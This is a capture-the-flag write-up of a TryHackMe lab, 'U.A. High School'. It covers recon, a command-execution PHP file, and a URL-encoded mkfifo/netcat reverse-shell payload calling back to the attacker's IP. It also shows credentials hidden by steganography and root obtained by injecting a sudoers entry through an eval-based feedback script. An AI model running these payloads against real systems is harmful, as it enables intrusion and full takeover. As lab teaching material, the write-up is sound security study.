## Initial Recon
Let's start with an nmap scan:
```console
$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.208.34
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)

| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

There is an **Apache webserver** running on **port 80**
![3eb7e593894b2f210fd17df670bd4066.png](3eb7e593894b2f210fd17df670bd4066.png){: w="700" h="300" .center}

After enumerating the website, we can see this `contact.html` page which accepts user-input.
![bae447c7a91e4aa4200460656ba4ad0c.png](bae447c7a91e4aa4200460656ba4ad0c.png){: w="700" h="300" .center .shadow}

But after further inspection, we see that the form doesn't really do anything because of the `action="#"` which simply reloads the webpage.

### Remote Code Execution
After spending some time enumerating directories and subdomains, we find the directory `/assets`

I started fuzzing this directory and that's when I found `index.php`
```console
$ gobuster dir -h "http://10.10.208.34/assets" -x php,html,txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

http://10.10.208.34/assets/.php                 (Status: 403) [Size: 277]
http://10.10.208.34/assets/.html                (Status: 403) [Size: 277]
http://10.10.208.34/assets/index.php            (Status: 200) [Size: 0]
http://10.10.208.34/assets/images               (Status: 301) [Size: 320] [--> http://10.10.208.34/assets/images/]
http://10.10.208.34/assets/.html                (Status: 403) [Size: 277]
http://10.10.208.34/assets/.php                 (Status: 403) [Size: 277]
```
{: .wrap }

This was very intressting to me since all other webpages were `html` files and since this was the only `php` file on the server, my spidey senses started tingling. So I added `?cmd=whoami` in the url and what do you know, we get something back:

![db7b5dc6c2804b42ec283a31e9c7ad8d.png](db7b5dc6c2804b42ec283a31e9c7ad8d.png){: w="600" h="300" .center .shadow}

> We could have fuzzed the parameters of this file by doing something like this:
> ```console
> wfuzz -u 'http://10.10.208.34/assets/index.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -c --hw 0

## Flag 1

### Getting a reverse shell
Since the output looked like it's `base64 encoded`, I used curl and piped its output to `base64 -d`
![3eb44c3ef5420f709142a879d6a4a875.png](3eb44c3ef5420f709142a879d6a4a875.png){: w="700" h="300" .center .shadow}
- We are `www-data`
- Now we can simply run a reverse-shell payload and get access to the server

I used this payload (mkfifo) and url encoded it
```shell
$ curl -s 'http://10.10.208.34/assets/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.11.75.248%2053%20%3E%2Ftmp%2Ff'
```
{: .wrap }

### Enumeration
After some manual enumeration, I found the directory `/var/www/Hidden_Content` and inside, the file `passphrase.txt`:

![2ba05db707e51e482581a01bee530ce3.png](2ba05db707e51e482581a01bee530ce3.png){: w="600" h="300" .center .shadow}
- The password inside was `base64 encoded` so I simply decoded it with `base64 -d`

Let's see what users are on the system:
```console
$ grep --color '/bin/bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
deku:x:1000:1000:deku:/home/deku:/bin/bash
```

I tried loging in via `SSH` with the user `deku` and the password that I had found but it wasn't the right password! So I used **linpeas** to enumerate the system further.

That is when I found this `/var/www/html/assets/images/oneforall.jpg`. Since I had only seen one picture on the website which was the background picture `yuei.jpg`, it got me curious.

### Magic Bytes - oneforall.jpg
So I downloaded the file and tried to opening it but it seemed to be corrupted.

After further inspection of the file, I realized that the magic bytes are indicating that this is a **PNG file**!
![9cb3240a2d191e1578b09998d69b0d0a.png](9cb3240a2d191e1578b09998d69b0d0a.png){: w="600" h="300" .center .shadow}
- So I looked up the magic bytes for `jpg` files and that's when I found this:
```text
FF D8 FF E0 00 10 4A 46 49 46 00 01
```

I used `hexeditor` to modify the magic bytes.
![a09980c05b1fd371778f5e438fbcb8f8.png](a09980c05b1fd371778f5e438fbcb8f8.png){: w="600" h="300" .center .shadow}

> Magic bytes, also referred to as magic numbers or file signatures, are sequences of bytes located at the beginning of a file. They serve as a unique identifier for the fileâ€™s format or type.

### Steganography
After modifying the magic bytes, we can see the picture but sadly, there is nothing usefull for us in it.
![02f7e29d5c9f8847f5991c24c7c071de.png](02f7e29d5c9f8847f5991c24c7c071de.png){: w="600" h="300" .center .shadow}
Or is there...?

I though maybe there is something hidden inside. So I used `steghide` to find out.
![be1ab66b48582de19de4b47fdd1b3b2b.png](be1ab66b48582de19de4b47fdd1b3b2b.png){: w="400" h="300" .center .shadow}
- Sure enough, there is a file called `creds.txt` hidden inside.
- This is when I remembered the password inside the `passphrase.txt`

Using that password allowed me to extract the hidden file:
```console
$ steghide extract -sf ./oneforall.jpg -xf ./creds.txt
Enter passphrase: [REDACTED]
wrote extracted data to "./creds.txt".
```
![5c4113cf893a86e9dc84630bb10fa0f1.png](5c4113cf893a86e9dc84630bb10fa0f1.png){: w="700" h="300" .center .shadow}
- Seems like this is a hidden message meant for `deku`
- Inside, we find `deku`'s credentials

Let's SSH into the system.

Right there, inside `deku`'s home directory, we find our first flag.
![1ba4f08ad24fe0e929a4fd7c66090ecd.png](1ba4f08ad24fe0e929a4fd7c66090ecd.png){: w="450" h="300" .center .shadow}

## Flag 2
### Enumeration
Let's see if we can run anything as `sudo`.
```console
$ sudo -l
[sudo] password for deku: [REDACTED]
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```
{: .wrap }

Our user can run the `/opt/NewComponent/feedback.sh` file with **root permissions**. Let's see if we can modify the file and run our own commands.

![2ec67ea96d118cd48a3c77c672fcde4d.png](2ec67ea96d118cd48a3c77c672fcde4d.png){: w="600" h="300" .center .shadow}
- It seems like we're the owner of the file
- So this should be as easy as overwriting the file's content and running it as `sudo`
- But NO! We somehow can't change the file at all.

Looking closer at the permissions, we can see that the `i` flag is set on this file which keeps other users form modifying this file in any way.

![dfc6b51d7eb32594aaeebb709dd3f092.png](dfc6b51d7eb32594aaeebb709dd3f092.png){: w="400" h="300" .center .shadow}

### Command Injection
Let's take a look at the script and see if we can do anything with it:
```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```
{: .wrap }
Let's break it down...

This simply outputs a banner to the screen.
```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."
```

This piece of code takes an input and stores it inside a variable called `feedback`
```bash
echo "Enter your feedback:"
read feedback
```

This part checks if the user supplied `feedback` contains any of the following characters:  `` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!` and/or `\`
```bash
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
```
{: .wrap }

If it **doesn't contain** any of those characters then it uses `eval` to `echo` our feedback to the screen and saves it to `/var/log/feedback.txt` which actually points to `/dev/null`
```bash
echo "It is This:"
eval "echo $feedback"

echo "$feedback" >> /var/log/feedback.txt
echo "Feedback successfully saved."
```

If our `feedback` however, **does contain** any of those characters, then we are shown an error.
```bash
else
    echo "Invalid input. Please provide a valid input." 
fi
```

After spending some time trying out different payloads, I realized that `>` character is not being filtered.
- That means we can actually modify files as `root` 
- By redirecting the `eval echo` command to a file of our own liking

We can do two things here
1. Either modify `/etc/passwd` and add a user with `uid 0` so when we log into the user, we have root access
2. Modify the `/etc/sudoers` file to give our current user root permissions

I went with the second one.

All we have to do is add `deku ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers`
- Since the `)` character is being filtered by the script, I passed `deku ALL=(ALL) NOPASSWD: ALL` an argument to the script
- Then I used `$1 >> /etc/sudoers` once the script asked me for feedback
- Here `$1` is simply **a variable** which contains **the first argument passed to the script** by the user

And after checking our `sudo` permissions, we see that we can **run anything** on the system **as root** without the need of a password.

We can now use `sudo su` to **pop a shell as root** and read the `/root/root.txt` file

## Outro
This was a very fun room. It was enumeration heavy for sure, but it kept the journey fun and interesting as it went on.

Many thanks to the creator of this room, [Fede1781](https://tryhackme.com/p/Fede1781).
